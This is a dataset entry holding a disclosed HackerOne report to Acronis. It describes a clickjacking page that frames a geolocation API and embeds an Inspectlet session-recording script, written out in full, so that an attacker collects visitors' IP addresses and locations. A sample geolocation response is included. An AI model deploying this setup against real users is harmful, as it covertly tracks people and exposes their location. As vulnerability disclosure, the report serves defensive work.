---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '925754'
original_report_id: '925754'
title: Get ip and Geo location any user via Clickjacking with inspectlet technology
weakness: Information Disclosure
team_handle: acronis
created_at: '2020-10-05T15:56:59.374Z'
disclosed_at: '2020-10-15T18:43:10.441Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 9
asset_identifier: '*.acronis.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- information-disclosure
---

# Get ip and Geo location any user via Clickjacking with inspectlet technology

## Metadata

- HackerOne Report ID: 925754
- Weakness: Information Disclosure
- Program: acronis
- Disclosed At: 2020-10-15T18:43:10.441Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

## Summary
Get ip and Geo location any user via Clickjacking with inspectlet technology

https://geoapi.acronis.com/?q=admin/views/ajax/autocomplete/user/a

## Steps To Reproduce
  1. go to F1015419
  2. will watch your geo data ex.
{"city":"Abu Kabir","country":{"name":"Egypt","code":"EG"},"location":{"accuracy_radius":1000,"latitude":30.7251,"longitude":31.6715,"time_zone":"Africa\/Cairo"},"region":{"name":"Sharqia","code":"SHR"},"ip":"154.237.109.156"}

  3.upload this page to any host and regsiter on https://www.inspectlet.com and add the tarcking code  to your clickjacking page to can screen recording the user Sessions

ex.
<!-- Begin Inspectlet Asynchronous Code -->
<script type="text/javascript">
(function() {
window.__insp = window.__insp || [];
__insp.push(['wid', 2060137667]);
var ldinsp = function(){
if(typeof window.__inspld != "undefined") return; window.__inspld = 1; var insp = document.createElement('script'); insp.type = 'text/javascript'; insp.async = true; insp.id = "inspsync"; insp.src = ('https:' == document.location.protocol ? 'https' : 'http') + '://cdn.inspectlet.com/inspectlet.js?wid=2060137667&r=' + Math.floor(new Date().getTime()/3600000); var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(insp, x); };
setTimeout(ldinsp, 0);
})();
</script>
<!-- End Inspectlet Asynchronous Code -->

  4. after victim going to clickjacking page attacker will get full geo data via  Session Recordings tab  on https://www.inspectlet.com

## Impact

Get ip and Geo location any user

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
